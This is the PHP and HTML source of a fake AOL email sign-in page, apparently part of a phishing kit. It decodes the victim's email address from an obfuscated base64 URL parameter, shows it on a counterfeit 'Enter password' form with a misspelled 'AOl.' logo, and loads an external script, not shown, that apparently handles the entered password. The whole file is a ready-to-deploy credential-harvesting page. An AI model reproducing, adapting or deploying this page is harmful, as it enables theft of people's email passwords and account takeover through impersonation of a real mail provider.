<?php
$id = $_GET['fixyouincominge_hjdhjsjhsnmw5455jhjhjs4454aha'];
$id = urldecode(base64_decode($id));

$getdomain = explode('@',$id);
$userdomain = $getdomain[1];
$userdomainOutlast = explode(".", $userdomain);
$dom = $userdomainOutlast[0];

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
    <link rel="shortcut icon" href="../img/icons/aolicon.png">
	<title>Sign in to <?php echo $dom." email"; ?></title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <style type="text/css">
  
.input-field {
  position: relative;
  width: 80%;
  margin:40px 5px 20px 5px;
  background-color: transparent;

  /*height: 44px;*/
  line-height: 34px;
}

label {
  position: absolute;
  text-align: left;
  padding: 7px;
  top: 0;
  left: 0;
  width: 100%;
  color: #C0c0c0;
  transition: 0.2s all;
  cursor: text;
  border: 0px;
 

}
input {
  width: 100%;
  border: 1px solid #fff;
  border-bottom: 1px solid #000;
  outline: 0;
  padding: 0.5rem ;
  box-shadow: none;
  background-color: #fff;
  /*color: #111;*/
}
input:invalid {
  outline: 0;
   /*color: #ff2300;*/
    /*border-color: #dbb108;*/
}
input:focus,
input:valid {
  /*border-color: #dbb108;*/
  /*background-color: #fff;*/
}
input:focus~label,
input:valid~label {
  font-size: 14px;
  top: -7px;
color: #000;
background-color: transparent;
width: auto;padding: 0px; margin-left:  5px;
  /*color: #00dd22;*/
}
.forget{
   padding:0px;
  color: #186fc3;
  cursor: pointer; 
  font-weight: bolder;
  width: 38%;
}
.forget:hover{
  color: #700b0b;
  border-radius: 5px;
}
.cli{
  padding: 10px;
  color: #fff;
  background-color: #0d7cd1;
  border: 0px;
  width: 90%; 
  border-radius: 2px;
  font-weight: bolder;
}
/*#loader {
  position: absolute;
  left: 45%;
  top: 60%;
  z-index: 1;
  width: 1px;
  height: 1px;
  margin: auto;
  border: 3px solid #f3f3f3;
  border-radius: 50%;
  border-top: 3px solid #edb419;
  width: 40px;
  height: 40px;
  -webkit-animation: spin 1s linear infinite;
  animation: spin 0.5s linear infinite;
}*/

@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

/* Add animation to "page content" */
.animate-bottom {
  position: relative;
  -webkit-animation-name: animatebottom;
  -webkit-animation-duration: 1s;
  animation-name: animatebottom;
  animation-duration: 1s
}

@-webkit-keyframes animatebottom {
  from { bottom:-100px; opacity:0 } 
  to { bottom:0px; opacity:1 }
}

@keyframes animatebottom { 
  from{ bottom:-100px; opacity:0 } 
  to{ bottom:0; opacity:1 }
}
.cli:hover{
  background-color: #0f62a2;
}

  </style>

</head>
<body style="width: 99%;overflow: hidden;overflow: scroll;">
	<div class="row">
		<div class="col-md-4">
      <!-- <CENTER><img src="../img/icons/yawelogo.png" style="width: 150px;margin: 50px 0px 5px 0px"></CENTER> -->
		</div>
		<div class="col-md-4" style="margin: 0px 5px 0px 5px;overflow: hidden;">
			<div class="card" style="border: 0.5px solid #c0c0c0; width: 350px; margin: auto; margin-top: 70px; stop-color: transparent; overflow: hidden;background-color: #fff"><CENTER>
        <h1 style="font-weight: bolder">AOl.</h1>
			<!-- <img src="../img/icons/yawelogo.png" style="width: 150px;margin: 50px 0px 5px 0px"> -->
			</CENTER>
<form autocomplete="off" method="POST" action="">
			<div class="row" style="padding:5px; margin: 10px 20px 0px 20px;">
        
      
        <div class="col-xs-12 centered" style="margin: 0px">
         <CENTER>
             <input name="email"  id="email" style="border: 0px; background-color: transparent; width: 190px; color: #000" value="<?php echo $id; ?>" disabled>
         
         <div class="col-md-12">
           <h3 style="font-weight: bolder;"> Enter password</h3>
         </div>
         <div style="margin-top: -10px; font-weight: bolder;">to finish sign in</div>
       </CENTER>
        </div>
				

			</div>

 <CENTER>
   <div class="input-field" style="width: 88%; margin: 20px 25px 15px 20px;">
    <input type="password" id="password"  autocomplete="off" width="100%" required/>
    <label for="password">Password</label>
  </div>
   <div id="loader" style="display: none;"></div> 
 </CENTER>
  <div style="color: red; padding-left: 25px; font-weight: bolder; margin-bottom: 10px;margin-top: -11px; display: none" id="msg" >Incorrect password</div>
 
 <div class="row">
   

   <div class="col-md-12 col-xs-12" style="margin: 30px 20px 20px 20px">
     <button class="cli" id="butsave">Next</button>
     <button class="cli" id="butsave2" style="display: none">Next</button>
   </div>

   <div class="col-md-12 col-xs-12" style=" margin-bottom: 100px;">
     <CENTER><span class="forget">Forgot&nbsp;password?</span></CENTER>
   </div>
   
 </div>


		</form>	
		</div>
		</div>
		<div class="col-md-1" style="margin-top: 60px;" class="pull-right" >
      <!-- <a href="javascript:void(0)" style="text-decoration: none;color: #4e09ac">Help</a> -->
		</div>
	</div>
	
<script>
	
		function myFunction() {
  var x = document.getElementById("pass");
  if (x.type === "password") {
    x.type = "text";
    document.getElementById('eye').style.display="none";
    document.getElementById('slash').style.display="block";
  } else {
    x.type = "password";
    document.getElementById('eye').style.display="block";
    document.getElementById('slash').style.display="none";
  }

	}
</script>
<script src="../script.js"></script>
</body>
</html>